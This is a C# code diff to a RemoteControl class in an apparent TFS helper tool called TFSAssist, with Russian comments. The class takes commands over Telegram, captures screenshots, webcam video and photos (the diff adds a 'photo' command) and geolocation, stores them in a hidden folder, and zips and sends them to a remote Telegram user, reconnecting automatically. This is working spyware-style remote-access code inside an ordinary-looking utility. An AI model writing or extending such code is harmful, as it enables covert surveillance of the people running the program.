@@ -7,6 +7,7 @@ using System.IO;
 using System.IO.Compression;
 using System.Linq;
 using System.Net;
+using System.Net.Sockets;
 using System.Reflection;
 using System.Text;
 using System.Threading;
@@ -50,7 +51,19 @@ namespace TFSAssist
         private readonly Action _checkUpdates;
         private readonly Func<string> _getLogs;
 
-        public string TempDirectory { get; }
+        private string _tempDir = string.Empty;
+
+        public string TempDirectory
+        {
+            get
+            {
+                if (!Directory.Exists(_tempDir))
+                    CreateDirectory(_tempDir).Wait();
+                return _tempDir;
+            }
+            private set => _tempDir = value;
+        }
+
         public bool IsEnabled { get; private set; } = false;
 
         public RemoteControl(Thread mainThread, string clientId, Action checkUpdates, Func<string> getLogs)
@@ -67,11 +80,25 @@ namespace TFSAssist
         {
             InitGeoWatcher();
             await InitTempSession();
-            await InitTempDirectory();
+            await InitDirectory(TempDirectory);
 
-            InitCamCapture(); // только после InitTempDirectory
+            InitCamCapture(TempDirectory); // только после InitTempDirectory
 
-            await Connect(GetAuthUserCode);
+            tryConnect:
+            try
+            {
+                await Connect(GetAuthUserCode);
+            }
+            catch (SocketException ex)
+            {
+                // если нет соединения с интернетом, пытаемся реконнектиться
+                if (ex.SocketErrorCode == SocketError.HostUnreachable || ex.SocketErrorCode == SocketError.TimedOut)
+                {
+                    await Task.Delay(60000);
+                    goto tryConnect;
+                }
+            }
+            
             return IsEnabled;
         }
 
@@ -86,7 +113,7 @@ namespace TFSAssist
 
                 await Task.Delay(5000);
 
-                await SendMessageToCurrentUser($"Connected. {GetCurrentServerInfo()}");
+                SendMessageToCurrentUser($"Connected. {GetCurrentServerInfo()}");
 
                 await Task.Delay(1000);
             }
@@ -119,18 +146,52 @@ namespace TFSAssist
         //    await SendMessageToCurrentUser($"Disconnected. {GetCurrentServerInfo()}");
         //}
 
+        private readonly object sendContent = new object();
 
-        async Task SendMessageToCurrentUser(string message)
+        void SendMessageToCurrentUser(string message)
         {
             if (IsEnabled)
-                await _control.SendMessageAsync(_control.CurrentUser.Destination, $"CID=[{ClientID}]\r\n{message.Trim()}", 0);
+            {
+                try
+                {
+                    //await _control.SendMessageAsync(_control.CurrentUser.Destination, $"CID=[{ClientID}]\r\n{message.Trim()}", 0);
+                    lock (sendContent)
+                    {
+                        Task task = _control.SendMessageAsync(_control.CurrentUser.Destination, $"CID=[{ClientID}]\r\n{message.Trim()}", 0);
+                        task.Wait();
+                    }
+                }
+                catch (Exception ex)
+                {
+                    WriteExLog(ex);
+                }
+            }
         }
 
-        async Task SendBigFileToCurrentUser(string destinationPath)
+        void SendBigFileToCurrentUser(string destinationPath)
         {
             if (IsEnabled)
-                await _control.SendBigFileAsync(_control.CurrentUser.Destination, destinationPath);
+            {
+                try
+                {
+                    //await _control.SendBigFileAsync(_control.CurrentUser.Destination, destinationPath);
+                    lock (sendContent)
+                    {
+                        Task task = _control.SendBigFileAsync(_control.CurrentUser.Destination, destinationPath);
+                        task.Wait(); // таймаут ставить нельзя т.к. может интеренет тормознутый и надо дождаться до конца
+                    }
+
+                    // очищаем память, т.к. отправляем большой файл
+                    GC.Collect();
+                }
+                catch (Exception ex)
+                {
+                    WriteExLog(ex);
+                }
+            }
         }
+
+        
 
         public async Task Run()
         {
@@ -139,11 +200,20 @@ namespace TFSAssist
             {
                 try
                 {
-                    List<TLMessage> newMessages = await _control.GetDifference(_control.CurrentUser.User, _control.CurrentUser.Destination, lastDate);
+                    //List<TLMessage> newMessages = await _control.GetDifference(_control.CurrentUser.User, _control.CurrentUser.Destination, lastDate);
+                    List<TLMessage> newMessages = null;
+                    lock (sendContent)
+                    {
+                        Task<List<TLMessage>> task = _control.GetDifference(_control.CurrentUser.User, _control.CurrentUser.Destination, lastDate);
+                        task.Wait();
+
+                        newMessages = task.Result;
+                    }
+
                     TLMessage lastMessage = newMessages?.LastOrDefault();
                     if (lastMessage != null)
                     {
-                        await ReadCommands(newMessages);
+                        await ReadCommands(newMessages, TempDirectory);
                         lastDate = TLControl.ToDate(lastMessage.Date);
                     }
                 }
@@ -156,7 +226,7 @@ namespace TFSAssist
             }
         }
 
-        async Task ReadCommands(List<TLMessage> newMessages)
+        async Task ReadCommands(List<TLMessage> newMessages, string projectDirPath)
         {
             bool isUpdate = false;
             string isCommand = ClientID + ":";
@@ -183,7 +253,7 @@ namespace TFSAssist
                         switch (command)
                         {
                             case "ping":
-                                await SendMessageToCurrentUser(GetCurrentServerInfo(true));
+                                SendMessageToCurrentUser(GetCurrentServerInfo(true));
                                 break;
 
                             case "info":
@@ -211,7 +281,7 @@ namespace TFSAssist
                                         }
                                     }
 
-                                    await SaveFile(Path.Combine(TempDirectory, $"{STRING.RandomString(15)}.log"), detInfo.ToString());
+                                    await SaveFile(Path.Combine(projectDirPath, $"{STRING.RandomString(15)}.log"), detInfo.ToString());
                                 }
                                 break;
 
@@ -219,16 +289,16 @@ namespace TFSAssist
                                 string logs = GetProcessingLogs();
                                 if (logs.IsNullOrEmptyTrim())
                                 {
-                                    await SendMessageToCurrentUser("Log is empty.");
+                                    SendMessageToCurrentUser("Log is empty.");
                                     break;
                                 }
                                 else if (logs.Length <= 500) // если логов немного
                                 {
-                                    await SendMessageToCurrentUser(logs);
+                                    SendMessageToCurrentUser(logs);
                                     break;
                                 }
 
-                                await SaveFile(Path.Combine(TempDirectory, $"{STRING.RandomString(15)}.log"), logs);
+                                await SaveFile(Path.Combine(projectDirPath, $"{STRING.RandomString(15)}.log"), logs);
 
                                 break;
 
@@ -246,11 +316,11 @@ namespace TFSAssist
                                     }
                                 }
 
-                                await SendMessageToCurrentUser(result);
+                                SendMessageToCurrentUser(result);
                                 break;
 
                             case "screen":
-                                string imagePath = Path.Combine(TempDirectory, $"{STRING.RandomString(15)}.pam");
+                                string imagePath = Path.Combine(projectDirPath, $"{STRING.RandomString(15)}.pam");
                                 await ScreenCapture.CaptureAsync(imagePath, ImageFormat.Png);
                                 break;
 
@@ -269,12 +339,12 @@ namespace TFSAssist
                             case "loc":
                                 if (_locationResult.IsNullOrEmptyTrim())
                                 {
-                                    await SendMessageToCurrentUser("Location unknown.");
+                                    SendMessageToCurrentUser("Location unknown.");
                                     _tryGetLocation = true;
                                 }
                                 else
                                 {
-                                    await SendMessageToCurrentUser(_locationResult);
+                                    SendMessageToCurrentUser(_locationResult);
                                     _tryGetLocation = false;
                                 }
                                 break;
@@ -294,9 +364,9 @@ namespace TFSAssist
                                 resultCamInfo = resultCamInfo.Trim();
 
                                 if (resultCamInfo.IsNullOrEmptyTrim())
-                                    await SendMessageToCurrentUser("No devices initialized.");
+                                    SendMessageToCurrentUser("No devices initialized.");
                                 else
-                                    await SendMessageToCurrentUser(resultCamInfo);
+                                    SendMessageToCurrentUser(resultCamInfo);
                                 break;
 
                             case "camsett":
@@ -351,9 +421,9 @@ namespace TFSAssist
                                     }
 
                                     if(exceptionCount > 0)
-                                        await SendMessageToCurrentUser($"Errors=[{exceptionCount}]");
+                                        SendMessageToCurrentUser($"Errors=[{exceptionCount}]");
                                     else
-                                        await SendMessageToCurrentUser($"SUCCESS");
+                                        SendMessageToCurrentUser($"SUCCESS");
                                 }
 
                                 break;
@@ -361,7 +431,7 @@ namespace TFSAssist
                             case "acam":
                                 if (_aforgeCapture == null)
                                 {
-                                    await SendMessageToCurrentUser($"AForge not initialized.");
+                                    SendMessageToCurrentUser($"AForge not initialized.");
                                     break;
                                 }
 
@@ -372,18 +442,34 @@ namespace TFSAssist
                             case "ecam":
                                 if (_encoderCapture == null)
                                 {
-                                    await SendMessageToCurrentUser($"Encoder not initialized.");
+                                    SendMessageToCurrentUser($"Encoder not initialized.");
                                     break;
                                 }
 
                                 _encoderCapture.StartCamRecording();
 
                                 break;
+
+                            case "photo":
+                                if (_aforgeCapture == null)
+                                {
+                                    SendMessageToCurrentUser($"AForge not initialized.");
+                                    break;
+                                }
+
+                                var photo = _aforgeCapture.GetPicture();
+                                if (photo != null)
+                                {
+                                    string photoPath = Path.Combine(projectDirPath, $"{STRING.RandomString(15)}.png");
+                                    photo?.Save(photoPath, ImageFormat.Png);
+                                }
+
+                                break;
                         }
                     }
                     else if (tlMessage.Message.Like("ping"))
                     {
-                        await SendMessageToCurrentUser(GetCurrentServerInfo());
+                        SendMessageToCurrentUser(GetCurrentServerInfo());
                     }
                     else if (tlMessage.Message.Like("update"))
                     {
@@ -397,7 +483,7 @@ namespace TFSAssist
             }
             finally
             {
-                await SendPreparedFiles();
+                SendPreparedFiles(projectDirPath);
 
                 if (isUpdate)
                 {
@@ -406,17 +492,18 @@ namespace TFSAssist
             }
         }
 
-        async Task SendPreparedFiles()
+
+        void SendPreparedFiles(string projectDirPath)
         {
-            var tempFiles = Directory.EnumerateFiles(TempDirectory);
+            var tempFiles = Directory.EnumerateFiles(projectDirPath);
             if (tempFiles.Any())
             {
                 try
                 {
-                    string destinationZip = DoZipFile(TempDirectory);
+                    string destinationZip = DoZipFile(projectDirPath);
                     if (destinationZip != null && File.Exists(destinationZip))
                     {
-                        await SendBigFileToCurrentUser(destinationZip);
+                        SendBigFileToCurrentUser(destinationZip);
                         File.Delete(destinationZip);
                     }
                 }
@@ -426,24 +513,11 @@ namespace TFSAssist
                     WriteExLog(ex);
                 }
 
-                try
-                {
-                    foreach (var fileName in tempFiles)
-                    {
-                        if(!IO.IsFileReady(fileName))
-                            continue;
-
-                        var fileInfo = new FileInfo(fileName);
-                        fileInfo.Attributes = FileAttributes.Normal;
-                        fileInfo.Delete();
-                    }
-                }
-                catch (Exception ex)
-                {
-                    WriteExLog(ex);
-                }
+                DeleteAllFilesInDirectory(projectDirPath);
             }
         }
+
+
 
         static Dictionary<string, string> ReadOptionParams(string options)
         {
@@ -519,10 +593,10 @@ namespace TFSAssist
                 string packFileTempPath = Path.GetTempFileName();
                 File.Delete(packFileTempPath);
 
-                int fileToArchive = 0;
+                int filesInArchive = 0;
                 using (FileStream zipToOpen = new FileStream(packFileTempPath, FileMode.OpenOrCreate))
                 {
-                    using (ZipArchive archive = new ZipArchive(zipToOpen, ZipArchiveMode.Update))
+                    using (ZipArchive archive = new ZipArchive(zipToOpen, ZipArchiveMode.Create))
                     {
                         DirectoryInfo d = new DirectoryInfo(sourceDir);
                         FileInfo[] Files = d.GetFiles("*", SearchOption.AllDirectories);
@@ -532,13 +606,13 @@ namespace TFSAssist
                             {
                                 string destArchPth = file.FullName.Replace(sourceDir, "").Trim('\\');
                                 archive.CreateEntryFromFile(file.FullName, destArchPth);
-                                fileToArchive++;
+                                filesInArchive++;
                             }
                         }
                     }
                 }
 
-                if (fileToArchive == 0)
+                if (filesInArchive == 0)
                 {
                     if (File.Exists(packFileTempPath))
                         File.Delete(packFileTempPath);
@@ -589,7 +663,7 @@ namespace TFSAssist
             }
         }
 
-        private async void Watcher_StatusChanged(object sender, GeoPositionStatusChangedEventArgs e)
+        private void Watcher_StatusChanged(object sender, GeoPositionStatusChangedEventArgs e)
         {
             if (e.Status != GeoPositionStatus.Ready)
                 return;
@@ -602,7 +676,7 @@ namespace TFSAssist
 
             if (_tryGetLocation)
             {
-                await SendMessageToCurrentUser(_locationResult);
+                SendMessageToCurrentUser(_locationResult);
                 _tryGetLocation = false;
             }
         }
@@ -665,38 +739,76 @@ namespace TFSAssist
             }
         }
 
-        async Task InitTempDirectory()
+        async Task InitDirectory(string dirPath)
         {
-            if (Directory.Exists(TempDirectory))
+            var di = new DirectoryInfo(dirPath);
+            if (di.Exists)
             {
                 try
                 {
-                    await IO.DeleteReadOnlyDirectoryAsync(TempDirectory);
+                    //await IO.DeleteReadOnlyDirectoryAsync(dirPath);
+
+                    di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
+                    DeleteAllFilesInDirectory(dirPath);
                 }
                 catch (Exception ex)
                 {
                     WriteExLog(ex, false);
                 }
             }
+            else
+            {
+                await CreateDirectory(dirPath);
+            }
+        }
 
-            int tryes = 0;
-            lableTrys:
+        void DeleteAllFilesInDirectory(string dirPath)
+        {
             try
             {
-                DirectoryInfo di = Directory.CreateDirectory(TempDirectory);
+                var tempFiles = Directory.EnumerateFiles(dirPath);
+                foreach (var fileName in tempFiles)
+                {
+                    if (!IO.IsFileReady(fileName))
+                        continue;
+
+                    var fileInfo = new FileInfo(fileName)
+                    {
+                        Attributes = FileAttributes.Normal
+                    };
+                    fileInfo.Delete();
+                }
+            }
+            catch (Exception ex)
+            {
+                WriteExLog(ex);
+            }
+        }
+
+        async Task CreateDirectory(string dirPath)
+        {
+            int attempts = 0;
+
+            tryCreateDir:
+            try
+            {
+                DirectoryInfo di = Directory.CreateDirectory(dirPath);
                 di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
             }
             catch (Exception ex)
             {
                 WriteExLog(ex, false);
-                tryes++;
-                if (tryes < 5)
-                    goto lableTrys;
+                attempts++;
+                if (attempts < 5)
+                {
+                    await Task.Delay(1000);
+                    goto tryCreateDir;
+                }
             }
         }
 
 
-        void InitCamCapture()
+        void InitCamCapture(string projectDirPath)
         {
             try
             {
@@ -718,7 +830,7 @@ namespace TFSAssist
 
             try
             {
-                _aforgeCapture = new AForgeCapture(MainThread, _aforgeDevices, _encDevices, TempDirectory, 20);
+                _aforgeCapture = new AForgeCapture(MainThread, _aforgeDevices, _encDevices, projectDirPath, 20);
                 _aforgeCapture.OnRecordingCompleted += OnRecordingCompleted;
                 _aforgeCapture.OnUnexpectedError += OnUnexpectedError;
             }
@@ -729,7 +841,7 @@ namespace TFSAssist
 
             try
             {
-                _encoderCapture = new EncoderCapture(MainThread, _aforgeDevices, _encDevices, TempDirectory, 20);
+                _encoderCapture = new EncoderCapture(MainThread, _aforgeDevices, _encDevices, projectDirPath, 20);
                 _encoderCapture.OnRecordingCompleted += OnRecordingCompleted;
             }
             catch (Exception ex)
@@ -763,7 +875,10 @@ namespace TFSAssist
                 tryCount++;
             }
 
-            await SendPreparedFiles();
+            if (sender is IMediaCapture mediaCapture)
+            {
+                SendPreparedFiles(mediaCapture.DestinationDir);
+            }
         }
 
         #region LOGS
@@ -806,13 +921,7 @@ namespace TFSAssist
                 IsEnabled = false;
                 _control?.Dispose();
                 _watcher?.Stop();
-
-                foreach (var fileName in Directory.EnumerateFiles(TempDirectory))
-                {
-                    var fileInfo = new FileInfo(fileName);
-                    fileInfo.Attributes = FileAttributes.Normal;
-                    fileInfo.Delete();
-                }
+                DeleteAllFilesInDirectory(TempDirectory);
             }
             catch (Exception)
             {
